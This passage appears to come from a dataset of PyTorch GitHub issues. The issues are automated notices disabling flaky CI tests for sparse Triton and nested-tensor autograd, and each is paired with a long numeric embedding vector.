2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_triton_bsr_scatter_mm_blocksize_16_cuda_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_sparse_csr.py`

cc @alexsamardzic @nikitaved @pearu @cpuhrsch @amjames @bhosmer",False,"[-2.82250822e-01 -1.84378922e-01 -1.12833738e-01  1.45837460e-02
 -4.89761084e-02 -2.17774108e-01  1.78399906e-01  9.84595865e-02
 -4.47217643e-01 -2.38050207e-01  2.43786305e-01 -1.90292448e-01
  2.16964364e-01  2.70604920e-02 -4.27469671e-01 -6.31240383e-03
 -1.10977769e-01  2.31560126e-01  2.80226797e-01  3.94234210e-02
 -2.84579217e-01 -3.14317131e-03 -3.84754181e-01  2.80360401e-01
  9.75558162e-02 -3.85137573e-02 -7.78424740e-02 -1.72574118e-01
 -5.80414757e-03 -6.51671514e-02  6.63321540e-02  1.25264853e-01
 -2.45155990e-01 -1.51612163e-02  3.94902378e-01  6.80340230e-02
 -2.28483006e-01 -1.65190950e-01 -2.85033025e-02 -4.74231392e-02
 -4.88760732e-02  2.27471143e-02  8.66929740e-02  9.10677239e-02
  7.51353055e-02 -1.85258016e-01 -3.01728666e-01  3.94969702e-01
 -2.20713422e-01  8.47220942e-02  1.68725327e-01 -1.85855720e-02
  5.32429889e-02 -2.98342913e-01 -2.79147383e-02 -6.02678716e-01
  3.77592593e-02  2.35452890e-01  1.04783356e-01  3.19167435e-01
  1.34152561e-01 -7.03288317e-02  3.12121417e-02 -1.39118023e-02
 -2.02746131e-02  1.85842991e-01  2.08188146e-02 -1.20916501e-01
  4.59874719e-01  8.95665437e-02  1.15948189e-02  2.73890436e-01
 -4.56512123e-01 -1.64395962e-02  1.32170487e-02  1.37724280e-02
 -2.38210529e-01 -3.84374633e-02 -9.72435027e-02  1.56962536e-02
 -1.79255232e-01  1.21624082e-01  5.29536493e-02 -3.24779510e-01
  1.22000307e-01 -2.67723612e-02  1.79023713e-01 -4.61564548e-02
  1.48949716e-02 -3.03078651e-01  3.76388460e-01  3.98425579e-01
 -2.83570409e-01  2.00890779e-01 -3.11076462e-01 -9.32206288e-02
  1.48799002e-01 -5.07188499e-01 -2.50681937e-01  6.15917295e-02
  2.32926577e-01 -1.89472139e-01 -2.18968779e-01  5.47658801e-01
 -2.79239058e-01 -2.34303296e-01  4.23739672e-01 -6.28890097e-02
 -3.48998681e-02  2.71544099e-01  1.69795886e-01 -9.94901061e-02
  3.36217545e-02  1.56913608e-01 -7.04168230e-02  1.18814781e-02
 -1.09234855e-01 -1.33008152e-01  9.07209069e-02  4.84396636e-01
 -1.87785566e-01 -1.27120435e-01 -1.95078440e-02 -2.99290940e-02
  4.67300445e-01 -3.00779380e-02  1.13877885e-01 -1.22944545e-02
 -1.41822398e-02 -1.22185126e-01  4.78683151e-02  1.52484387e-01
 -1.70195043e-01 -8.86725634e-02 -5.23148961e-02  2.95611382e-01
 -3.27500999e-01 -3.45351666e-01 -6.24635741e-02 -7.21348524e-02
 -3.31731766e-01  8.96546617e-02 -1.15752392e-01 -1.73711210e-01
  4.58119661e-01  1.20638564e-01 -4.39475060e-01  2.16472626e-01
 -6.12059757e-02  6.18610680e-02  1.64903224e-01  3.96891944e-02
 -5.52484859e-03  3.56131852e-01 -2.36474693e-01  3.69624197e-02
  5.56789875e-01  8.26655999e-02 -7.06833601e-02 -2.09625810e-01
  8.83080661e-02  3.88554960e-01 -1.63007043e-02 -5.53291962e-02
  1.08036213e-04  1.99621469e-02 -1.43964127e-01  1.62690014e-01
 -2.24986792e-01  1.70101196e-01  1.33729219e-01 -1.36361897e-01
  1.18966684e-01  6.47000745e-02  2.17876241e-01 -1.30866155e-01
 -3.51629630e-02 -2.11548299e-01  8.41841623e-02  3.76415998e-01
 -9.16057900e-02  2.81376719e-01  3.61418545e-01  1.24865584e-01
  3.80740091e-02  5.93216866e-02  2.05007002e-01  1.52443066e-01
  3.10470741e-02  6.05554134e-02 -2.14365423e-01 -3.03925306e-01
  2.85464942e-01 -8.56196880e-02 -2.29944497e-01 -4.40767147e-02
  1.03253461e-01 -6.05723858e-02  1.74938124e-02  6.24426231e-02
 -1.27299041e-01  7.27335066e-02  2.92029142e-01 -1.88511580e-01
 -3.95078622e-02 -9.30838212e-02 -9.13541913e-02 -4.79025126e-01
  3.91344905e-01 -3.40633914e-02 -4.48459327e-01 -4.65508103e-01
 -4.52086359e-01 -2.89549649e-01 -3.06352377e-01  2.31605157e-01
  1.56731188e-01 -3.28170717e-01  1.22780636e-01  3.67286563e-01
 -1.48422316e-01 -2.30716497e-01 -5.48479632e-02 -2.02395886e-01
 -3.58008444e-02 -3.37560415e-01  5.89369750e-03  1.66653037e-01
 -1.67708397e-01  8.92569423e-02 -7.49768838e-02 -1.15465052e-01
  1.93793043e-01  1.41683504e-01  8.84854794e-02 -7.86641464e-02
 -4.06758904e-01 -1.47532076e-01 -4.61024493e-02  3.89793754e-01
 -1.45619065e-01 -2.33331081e-02 -1.23445550e-02  2.13744445e-03
  1.15341410e-01  2.21157238e-01 -9.68556665e-03 -1.19559117e-01
 -1.44799411e-01 -1.00824423e-03 -1.24814712e-01 -3.82637560e-01
  1.90498322e-01  7.48620480e-02  3.03254038e-01  1.01216368e-01
 -1.09681096e-02 -1.56118184e-01  1.81946397e-01 -1.97575688e-01
  3.40212077e-01  3.98294598e-01 -1.88846678e-01  3.09805036e-01
  1.52337074e-01  8.09647590e-02 -1.51133627e-01  5.80715127e-02
  1.95042521e-01 -5.25497720e-02  1.96000367e-01 -3.56174529e-01
  3.12915683e-01 -2.28234716e-02  2.86918461e-01 -3.54924381e-01
  3.11192542e-01  1.15831301e-01  2.61917524e-02 -1.00963764e-01
 -6.62852451e-02  1.84043288e-01 -3.61081213e-03  1.55018598e-01
  2.13266350e-02 -2.44101763e-01 -3.17457676e-01 -3.00698698e-01
 -1.05400786e-01 -1.93668455e-01 -1.01183832e-01  5.67977667e-01
  2.38358498e-01 -1.03659041e-01 -2.23287731e-01  2.12918296e-01
  3.19887280e-01 -1.48981348e-01 -3.80409881e-03 -1.04076751e-01
 -2.14827105e-01 -2.58324612e-02  5.38758337e-02 -1.93757206e-01
  5.40169030e-02  8.37973654e-02  1.41809642e-01  2.39486575e-01
  2.07972020e-01 -8.52645412e-02  3.77537683e-02  1.94316059e-01
 -4.93474752e-02  3.89774501e-01  4.79296073e-02 -8.96066055e-03
  1.03212416e-01  3.07156146e-01  2.14502648e-01 -1.66471377e-02
  4.33876775e-02 -3.13927293e-01 -4.53731507e-01  2.41680816e-02
  7.96580091e-02 -1.07906416e-01 -2.47925818e-01  2.27124430e-02
  2.08455566e-02 -3.62125039e-03  8.77540000e-03 -3.06456648e-02
 -2.02732638e-01 -1.51333079e-01  1.02006257e-01 -1.37116201e-03
 -1.00830674e-01  2.39729673e-01  2.67858863e-01 -1.64888889e-01
  1.46797448e-02 -1.96438372e-01  2.09480703e-01 -3.53928745e-01
 -1.08011745e-01  1.48646589e-02  2.82360137e-01  5.21174192e-01
  2.97557767e-02 -2.41732225e-01 -1.04957223e-01 -5.16687334e-03
 -2.31272370e-01 -9.23418552e-02  2.56807059e-01  5.64056754e-01
  1.23797432e-01  2.57259727e-01  1.43050909e-01  4.28875178e-01
 -3.79632533e-01 -2.33075097e-01 -3.83336842e-01 -3.46251726e-01
  1.89696535e-01 -1.91416562e-01 -1.39169976e-01 -1.75161183e-01
  2.13908434e-01  6.95662498e-02 -3.68491709e-01  1.72376543e-01
  2.03209445e-02  4.15875912e-01  3.76375198e-01 -1.10780746e-01
  1.69633612e-01 -1.77639484e-01  7.72204250e-02  9.72133875e-02
  5.27452789e-02  8.33980292e-02  1.84352189e-01  2.42539793e-01]"
DISABLED test_triton_bsr_scatter_mm_blocksize_16_cuda_bfloat16 (__main__.TestSparseCompressedTritonKernelsCUDA) module: sparse triaged module: flaky-tests skipped,"Platforms: linux, slow

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_triton_bsr_scatter_mm_blocksize_16_cuda_bfloat16&suite=TestSparseCompressedTritonKernelsCUDA) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18075318735).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_triton_bsr_scatter_mm_blocksize_16_cuda_bfloat16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_sparse_csr.py`

cc @alexsamardzic @nikitaved @pearu @cpuhrsch @amjames @bhosmer",False,"[-2.68357217e-01 -1.71585500e-01 -1.13855183e-01 -3.31052244e-02
  4.30347119e-03 -1.68766052e-01  2.33763099e-01  6.72992691e-02
 -4.31742519e-01 -2.31206372e-01  2.41985619e-01 -1.77918404e-01
  2.18106627e-01  8.02917220e-03 -4.02771264e-01 -6.98096678e-03
 -1.23215392e-01  2.39093333e-01  3.42718750e-01  1.14790350e-03
 -2.70715773e-01  7.23558571e-03 -3.41527700e-01  2.65898973e-01
  6.73372149e-02 -9.20783058e-02 -7.93503970e-02 -1.90183207e-01
 -5.00033349e-02 -3.54282632e-02  1.21180534e-01  1.34437144e-01
 -1.82982266e-01 -5.50282933e-02  4.29345310e-01  9.09401178e-02
 -2.62314975e-01 -1.44842565e-01  2.47040950e-03 -7.25136101e-02
  3.49591486e-04  3.25221755e-02  1.22670215e-02  1.24014020e-01
 -1.80259738e-02 -1.51668608e-01 -3.53130251e-01  4.17275935e-01
 -2.85529077e-01  7.89309889e-02  1.18927240e-01 -6.67883605e-02
 -7.02240020e-02 -2.92357326e-01  7.37192929e-02 -5.31142950e-01
  1.92854553e-02  3.65524352e-01  1.27044603e-01  3.46149087e-01
  9.89383608e-02 -4.54866849e-02  2.04029605e-02 -4.92047444e-02
 -7.64038321e-03  1.90109283e-01 -9.23098996e-04 -9.92831215e-02
  4.43422437e-01  1.35938168e-01  2.69665085e-02  2.33405560e-01
 -4.63532269e-01  4.31715623e-02 -8.54771025e-03  2.53191851e-02
 -2.99727380e-01 -6.09814376e-03 -1.06717080e-01  3.22401971e-02
 -2.51374930e-01  1.62796378e-01  1.36359297e-02 -3.21661890e-01
  2.07116202e-01  4.93527800e-02  1.34425506e-01 -9.79155898e-02
 -2.28386819e-02 -2.54364610e-01  3.39290380e-01  2.84894764e-01
 -2.07566768e-01  1.36695102e-01 -3.00596863e-01 -4.30099927e-02
  2.03990608e-01 -5.29438138e-01 -2.71971107e-01  1.10262156e-01
  2.52782941e-01 -1.94781303e-01 -1.59037605e-01  5.54188490e-01
 -3.07822049e-01 -2.18843609e-01  3.31706375e-01 -9.66492891e-02
 -3.16906907e-02  2.38573492e-01  1.16555870e-01 -8.37823898e-02
  9.68220457e-03  1.58851296e-01 -4.34856210e-03 -1.20623112e-02
 -1.18448734e-01 -1.63722247e-01  1.58836916e-01  5.64657271e-01
 -1.54022694e-01 -1.46519020e-01 -2.73065343e-02 -7.51865357e-02
  3.78977835e-01 -1.52774826e-02  1.77892342e-01 -6.24157209e-03
  4.94455881e-02 -1.27478138e-01  3.65041196e-02  1.20908931e-01
 -1.91786528e-01 -1.13935433e-01 -8.62383991e-02  2.22376019e-01
 -3.43666106e-01 -3.95733804e-01 -5.13298400e-02 -1.20489933e-01
 -3.08331996e-01  6.43448085e-02 -3.64823118e-02 -6.47548139e-02
  3.92295778e-01  1.86901689e-01 -4.34054911e-01  2.73969889e-01
 -9.37084854e-02  3.98933068e-02  1.23835996e-01  2.58705597e-02
  2.35261321e-02  2.67629385e-01 -1.60934672e-01  3.33888456e-02
  5.44764161e-01  1.39416233e-01 -4.76736054e-02 -2.06791669e-01
  9.28930044e-02  3.62415850e-01 -4.36211713e-02 -1.62933290e-01
 -3.03847156e-03 -5.72360158e-02 -1.59656167e-01  1.43510908e-01
 -1.29815757e-01  1.18232682e-01  9.03954208e-02 -1.51383638e-01
  1.14727139e-01  3.52460630e-02  1.98202625e-01 -1.20726854e-01
 -4.67531309e-02 -2.16966659e-01  1.50474757e-01  3.58009011e-01
 -7.23037720e-02  3.07395399e-01  2.79020488e-01  1.45657897e-01
  4.74162586e-02  6.69580027e-02  1.85198352e-01  1.25140011e-01
  2.87711043e-02  3.96835655e-02 -1.41127527e-01 -3.01882535e-01
  3.68052244e-01 -1.12954460e-01 -2.41264999e-01 -9.30436701e-02
  9.77609009e-02 -5.35761788e-02 -9.93135571e-03  4.07475606e-02
 -1.00722007e-01  1.13456860e-01  3.00935596e-01 -1.58308893e-01
 -1.19773764e-02 -2.99764909e-02 -1.76734924e-01 -4.13172781e-01
  4.08874512e-01  4.11598161e-02 -4.65962142e-01 -4.40399945e-01
 -3.83038700e-01 -2.98074782e-01 -2.50429541e-01  1.78680807e-01
  1.05076939e-01 -2.91808665e-01  2.43314356e-01  3.66347075e-01
 -1.90658554e-01 -1.82368457e-01 -1.37234211e-01 -1.98075503e-01
 -5.60549274e-03 -3.31212819e-01  1.29197150e-01  1.12362973e-01
 -1.99345082e-01  7.09201321e-02 -7.11046830e-02 -9.23681557e-02
  1.51580542e-01  9.14014131e-02  1.73118174e-01 -1.27947897e-01
 -2.72584021e-01 -1.95259988e-01 -1.59436464e-03  4.29689407e-01
 -1.15428396e-01  2.09852159e-02 -5.64892739e-02 -7.65695702e-04
  8.03123266e-02  1.54722661e-01 -1.55391265e-02 -1.82457060e-01
 -1.62350774e-01 -2.90381089e-02 -1.64831251e-01 -3.80792469e-01
  1.44039810e-01  7.34555125e-02  3.17694515e-01  1.28548279e-01
 -1.66700333e-01 -1.55962944e-01  1.82026923e-01 -1.78876281e-01
  3.74519229e-01  3.80785942e-01 -1.53636158e-01  2.34906435e-01
  1.74968660e-01  1.03162110e-01 -1.31770402e-01  5.77346087e-02
  2.30697945e-01 -7.04086199e-02  1.71304181e-01 -3.34340662e-01
  2.58530527e-01  4.06259894e-02  3.63508910e-01 -2.32425153e-01
  2.89096296e-01  1.00081258e-01 -1.28526054e-02 -6.29078373e-02
 -3.96399051e-02  1.71023577e-01  1.99206378e-02  2.20873326e-01
  4.37357090e-02 -2.49266893e-01 -3.58963311e-01 -2.63694018e-01
 -1.17816031e-01 -1.68883741e-01 -1.07618511e-01  5.93944132e-01
  2.56695718e-01 -1.97121456e-01 -1.64005086e-01  2.92529494e-01
  2.37630397e-01 -1.01202920e-01 -1.09767932e-02 -1.25713050e-01
 -2.48585075e-01 -6.64656311e-02  4.47290465e-02 -1.30589068e-01
  1.84942707e-02  1.21514961e-01  6.87201098e-02  1.90120652e-01
  2.09918231e-01 -1.19005755e-01  6.16293214e-02  3.48479688e-01
 -3.18028312e-03  3.16779077e-01 -3.88368219e-02 -3.59066110e-03
  8.67633298e-02  3.29266191e-01  2.49517679e-01 -3.27745453e-03
  8.13413560e-02 -3.08520198e-01 -5.33006370e-01  2.40229201e-02
  9.57558304e-02 -1.01708904e-01 -3.20574611e-01 -2.28665844e-02
 -3.34120095e-02 -4.04778160e-02  3.29929516e-02  2.59295255e-02
 -2.53883302e-01  1.63867790e-02  1.11279227e-01 -5.77424932e-03
 -8.35837200e-02  1.92655936e-01  3.05020332e-01 -1.58772230e-01
  7.25000799e-02 -2.01567128e-01  2.66410112e-01 -3.15258890e-01
 -1.65446267e-01  2.74273325e-02  2.72025883e-01  5.29994130e-01
 -2.94885971e-02 -1.92786843e-01 -1.50098696e-01 -1.23081990e-02
 -3.05591494e-01 -1.28519744e-01  1.92703635e-01  5.78361630e-01
  8.00311416e-02  3.04338574e-01  1.13866754e-01  3.67273748e-01
 -3.29104722e-01 -3.17265093e-01 -3.65553021e-01 -2.90854275e-01
  1.71609774e-01 -2.19467655e-01 -1.27289504e-01 -2.46351019e-01
  1.63334012e-01  6.59707040e-02 -3.72140825e-01  1.87215641e-01
  9.68568958e-03  3.56934249e-01  2.96148419e-01 -6.84329271e-02
  1.98631987e-01 -2.02978358e-01 -3.49572487e-02  6.66031390e-02
  5.49927056e-02  1.78400576e-01  2.31704682e-01  2.65761703e-01]"
DISABLED test_dropout_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18072901313).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-2.93858945e-01  3.90293449e-03 -6.68191463e-02 -3.69141810e-03
 -3.03427167e-02 -4.33589637e-01 -4.72188741e-03  1.64307803e-01
 -3.75263959e-01 -1.79113030e-01  3.48439097e-01 -9.51618850e-02
  2.57026762e-01  1.32239133e-01 -3.15669551e-03 -1.31155103e-01
 -1.12864733e-01 -6.48029596e-02  4.99807835e-01  1.45710766e-01
 -2.72691995e-01 -1.68892741e-03 -2.56641746e-01  2.66046464e-01
  1.67578340e-01  7.46232457e-03 -2.15246215e-01 -9.38485786e-02
 -3.10769584e-02  3.85238081e-02  2.51926303e-01  1.12142056e-01
 -2.45101526e-01 -2.22069770e-02  4.63927239e-01  2.34062150e-01
 -2.70886831e-02 -1.96282372e-01 -3.15202773e-01 -1.33799136e-01
  2.27130607e-01  5.31227700e-02 -7.74824247e-02 -1.08354218e-01
  2.26700246e-01  1.02588683e-02 -1.64857015e-01  2.20618159e-01
 -2.58570790e-01 -2.07919404e-01  1.28750980e-01 -1.07465737e-01
  5.02074733e-02 -4.63180035e-01  1.15086108e-01 -6.94211572e-02
  1.99035153e-01  4.08463001e-01  1.22464694e-01  3.08844328e-01
  1.16967984e-01 -3.41978595e-02 -2.06695229e-01 -6.45910501e-02
  1.32825561e-02  8.43970943e-03  2.62671053e-01 -2.35940814e-01
  4.52949762e-01 -1.14342295e-01  1.66233301e-01 -1.12078175e-01
 -2.57480830e-01 -1.13133952e-01  1.00434899e-01  2.16720805e-01
 -3.17065954e-01  2.65160408e-02 -3.38850468e-02 -6.40180260e-02
 -1.20612178e-02  5.32038435e-02 -3.97943184e-02  1.62059337e-01
  1.64547846e-01  7.77302533e-02  1.85554683e-01 -9.98892263e-03
  2.05262914e-01 -2.29336724e-01  9.16493982e-02  8.43970776e-02
 -2.02809498e-01 -3.10476515e-02 -2.00245529e-01 -2.92101055e-02
  3.31663519e-01 -1.39646411e-01 -3.33599955e-01  1.97922066e-01
  1.37241662e-01 -3.95716846e-01 -1.93622615e-02  2.67749727e-01
 -2.79295146e-01 -3.76338959e-01  4.39313143e-01  1.25684619e-01
  1.34184852e-01 -1.89404443e-01  1.39969483e-01  7.15987533e-02
 -2.55615674e-02  2.84572393e-02  6.17247447e-02 -8.16783458e-02
 -1.24190390e-01 -1.90614834e-01  8.52437317e-03  5.44848144e-01
 -2.40572542e-01 -1.15629464e-01  2.05496937e-01  1.06180329e-02
  2.58180022e-01 -6.86128624e-03 -1.05885617e-01 -4.04223427e-03
  1.40679792e-01 -2.38627456e-02  7.32438415e-02  7.98618048e-02
 -2.36829460e-01 -2.20478892e-01  8.22532177e-02 -1.66578107e-02
 -9.56599712e-02 -2.44261995e-01  3.35701630e-02 -1.22112818e-02
 -1.44671321e-01  1.93478972e-01  5.84364161e-02 -2.27907300e-01
  1.51763305e-01  2.74137035e-02 -3.03714685e-02  1.35494381e-01
 -8.47821869e-03  4.70159128e-02 -1.16032371e-02  1.09344959e-01
  3.52043092e-01  4.22911227e-01  4.15172428e-03 -2.77587958e-03
  3.18598509e-01  1.31251708e-01  1.00191280e-01 -7.14600012e-02
 -2.43883692e-02  4.66275573e-01 -1.12038665e-01 -3.05091888e-02
  2.34180495e-01 -1.79700047e-01 -4.86702502e-01  2.22700965e-02
  1.40833873e-02  1.58439934e-01 -1.92140341e-01 -4.76498269e-02
  1.43681526e-01 -1.59402072e-01 -8.60076398e-02 -1.02601320e-01
  3.34580779e-01 -3.63160133e-01 -1.23242036e-01  2.16770589e-01
  6.15438595e-02  8.89671221e-03  1.91329032e-01  1.32675752e-01
 -1.46700609e-02  2.46160686e-01  2.30141327e-01 -1.18612185e-01
  2.31053866e-02 -1.27435252e-01 -6.75700068e-01 -1.81685254e-01
  5.14680557e-02 -4.23442423e-02 -2.48440355e-01 -2.07931861e-01
 -4.01883312e-02 -3.60875204e-02 -1.21130258e-01  8.41892511e-02
 -2.56696403e-01  2.77411819e-01  2.72009790e-01 -3.53204235e-02
 -4.93060797e-04  1.87879503e-01 -3.16164941e-01 -4.35660303e-01
  1.86797053e-01  2.26965919e-02 -2.21452385e-01 -1.36281028e-01
  3.01764198e-02 -1.47427753e-01 -1.59272701e-02  6.01918921e-02
 -4.46169041e-02  5.48973158e-02  3.53365391e-03  1.71553180e-01
 -3.10290337e-01 -3.51548977e-02 -2.75405884e-01 -1.18561029e-01
 -3.20427537e-01 -3.93031240e-02 -1.36773854e-01  2.74901807e-01
  3.91162857e-02 -2.29536798e-02 -1.45410895e-01 -2.16913566e-01
  1.70296773e-01 -1.22305602e-02  2.69172430e-01 -1.89403266e-01
 -2.30247647e-01  4.05274741e-02  1.46592250e-02  5.18445849e-01
 -4.80569661e-01 -5.97503662e-01 -5.53095452e-02  1.49821699e-01
  9.19990242e-02  1.27112001e-01 -6.48561418e-02 -2.27036357e-01
 -1.65576056e-01  2.16176920e-02 -1.17749423e-01 -2.00043544e-01
  1.38963506e-01 -6.07011020e-02  1.16862893e-01  4.74553555e-01
 -6.16859719e-02  9.89813730e-02  4.53082994e-02  5.29079884e-02
 -1.28107801e-01  4.13732886e-01 -1.06208518e-01  3.84906799e-01
  1.51566014e-01  1.01724476e-01 -1.66434348e-01 -1.09712034e-03
  1.79599263e-02 -1.83361575e-01  3.93340528e-01 -6.24744833e-01
  4.30321880e-03  1.28102869e-01  2.52714157e-01 -1.77689701e-01
  3.90094787e-01  1.41452149e-01  3.36149894e-02 -1.87368080e-01
  2.23316982e-01  1.04405947e-01 -2.10954234e-01 -1.06270567e-01
  1.91351503e-01 -3.58310789e-01 -5.79259396e-02 -1.22956246e-01
 -2.44400412e-01 -5.27816042e-02 -1.43024027e-01  2.71565557e-01
  9.16199759e-02  2.31506675e-02 -3.97531688e-01  6.37535155e-02
  2.56191969e-01 -2.70629883e-01  9.20274258e-02 -2.27346152e-01
 -2.49259785e-01 -6.60614520e-02  1.07152633e-01 -2.97715455e-01
  5.97170405e-02 -5.57310060e-02  1.13698542e-01 -5.75335957e-02
  4.33522522e-01 -2.68791497e-01 -5.90344369e-02  3.12795162e-01
 -7.02193975e-02  1.99448019e-01  3.24043259e-03 -1.79066546e-02
 -4.66263443e-02  2.60488093e-01 -1.06157042e-01  1.71854436e-01
  3.18752944e-01 -5.67949712e-02 -3.64737868e-01  2.27810666e-01
  2.26320133e-01  4.92888466e-02 -3.11597884e-01 -1.39847733e-02
 -4.16844487e-02 -2.61589661e-02 -1.45079076e-01 -1.04637124e-01
 -1.83558553e-01 -1.38411880e-01  1.28539696e-01 -9.20586213e-02
 -1.58824533e-01  4.63205993e-01  9.53135639e-03 -2.65103281e-01
  1.08686060e-01 -1.48809515e-03  2.60987151e-02 -2.41535619e-01
 -1.34255096e-01  9.81416646e-03  2.04237789e-01  2.15046853e-01
  1.43911749e-01  1.66314140e-01 -2.39012569e-01  8.88658911e-02
 -3.40274811e-01 -2.22505093e-01 -3.84943113e-02  5.53026676e-01
  1.64674148e-01  8.48350078e-02  4.13130730e-01  5.68610489e-01
 -1.57214731e-01 -1.45012602e-01 -3.49421561e-01 -2.33363837e-01
  9.79194716e-02 -1.77043285e-02 -8.70894417e-02  4.64150682e-03
  1.28186613e-01  2.53575504e-01 -3.79135251e-01  2.06754923e-01
 -1.49062693e-01  2.72651196e-01  1.93789750e-01 -3.59041840e-02
  2.03104720e-01 -2.80097723e-01  1.13447644e-02  1.44920312e-04
 -1.89947367e-01  9.32795405e-02  4.46304232e-02  2.36695498e-01]"
DISABLED test_backward_sub_strided_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_sub_strided_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18066521053).

Over the past 3 hours, it has been determined flaky in 8 workflow(s) with 24 failures and 8 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_sub_strided_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.09803277e-01  6.80944324e-02 -1.40556917e-01 -2.01642513e-03
 -7.19015300e-02 -3.86716485e-01  1.78838670e-02  1.69952244e-01
 -3.76111567e-01 -1.71818778e-01  3.37045074e-01 -7.02439398e-02
  2.95620322e-01  4.93952930e-02 -1.97605900e-02 -9.09881443e-02
 -5.02061471e-02 -3.62330675e-02  4.27606106e-01  6.90959096e-02
 -2.87977457e-01  4.34901193e-02 -3.14060926e-01  3.06534290e-01
  1.41830161e-01 -2.17475221e-02 -1.94462389e-01 -8.21254849e-02
  7.08488300e-02  4.60295565e-02  2.31716976e-01  2.69176736e-02
 -3.07623684e-01  3.48167401e-03  4.93312299e-01  3.04262102e-01
 -2.33064294e-02 -2.13831961e-01 -3.28098834e-01 -4.33095619e-02
  2.24393457e-01 -4.61233817e-02 -1.02599606e-01 -1.42027408e-01
  1.95356086e-01 -5.04905581e-02 -2.34969720e-01  2.44250417e-01
 -3.17838430e-01 -6.81557655e-02  1.55632704e-01 -7.18696043e-02
  3.10425516e-02 -4.50543702e-01  1.04721472e-01 -2.27216538e-02
  1.64447457e-01  4.74520743e-01  1.22933194e-01  1.51571542e-01
  1.04260936e-01  5.03460988e-02 -1.93130732e-01 -5.48663177e-03
 -2.21031718e-02 -3.40645239e-02  1.99649006e-01 -3.06003243e-01
  4.41903949e-01  3.62354815e-02  1.45639777e-01 -1.59441948e-01
 -3.62451077e-01 -1.53159872e-01  2.16048509e-01  2.77889013e-01
 -2.74304628e-01  4.39625494e-02 -9.38173085e-02 -2.80212700e-01
 -4.97830138e-02  1.78245958e-02 -2.08503883e-02  1.72418877e-01
  2.09788114e-01  1.74791142e-02  1.28479272e-01 -7.74472132e-02
  1.83287889e-01 -2.44151145e-01  9.69332755e-02  1.81692168e-02
 -1.02390364e-01  1.24078244e-04 -2.19666004e-01  1.48152886e-02
  2.28362769e-01 -8.77128243e-02 -2.57433832e-01  1.86601788e-01
  1.14476301e-01 -3.78441244e-01 -3.66563275e-02  3.98306012e-01
 -2.85784632e-01 -3.17797244e-01  5.05623102e-01  1.07021272e-01
  1.43007904e-01 -8.21377933e-02  1.15172453e-01  6.67528063e-02
  4.08501923e-02  5.76432906e-02  8.61636996e-02 -1.20066956e-01
 -2.09984854e-01 -1.22380085e-01 -6.49662763e-02  5.15971661e-01
 -2.69871414e-01 -5.99013194e-02  1.79953858e-01 -7.06695579e-03
  1.90298706e-01  2.34416407e-02 -3.82320769e-02  8.13364238e-03
  2.17440426e-01 -1.35536306e-03  9.47931036e-02  7.90705979e-02
 -2.15526402e-01 -1.89688921e-01  1.12336494e-01 -1.57957505e-02
 -1.02707252e-01 -2.27529153e-01  4.62965369e-02  6.72896579e-02
 -1.56428814e-01  1.62114263e-01 -1.25180539e-02 -2.30036676e-01
  3.00688565e-01 -6.89470768e-03 -6.16300888e-02  1.38559252e-01
 -3.88054587e-02  6.59634173e-02  1.17994957e-02 -6.60324842e-03
  2.14974567e-01  3.44420224e-01  2.95222737e-02  9.96057093e-02
  3.15139234e-01  1.54645234e-01  1.24309562e-01 -2.60671675e-02
 -8.04117993e-02  4.85004991e-01 -6.28156960e-02  1.16735876e-01
  3.28059077e-01 -1.93296149e-01 -4.27529037e-01  4.93206196e-02
 -9.97903347e-02  1.61366686e-01 -9.07446668e-02 -1.02185406e-01
  1.13905229e-01 -1.00539222e-01  2.72112936e-02 -1.15581796e-01
  2.13402838e-01 -2.97604799e-01 -1.71235859e-01  2.74394274e-01
  3.95316780e-02  3.52247879e-02  1.79111212e-01  8.32161605e-02
 -3.69396172e-02  2.83850789e-01  2.92381138e-01 -2.86909286e-02
 -2.73416750e-03 -5.22543117e-03 -6.25897527e-01 -2.04502344e-01
  3.87919247e-02 -8.95907730e-03 -2.56630957e-01 -2.42652282e-01
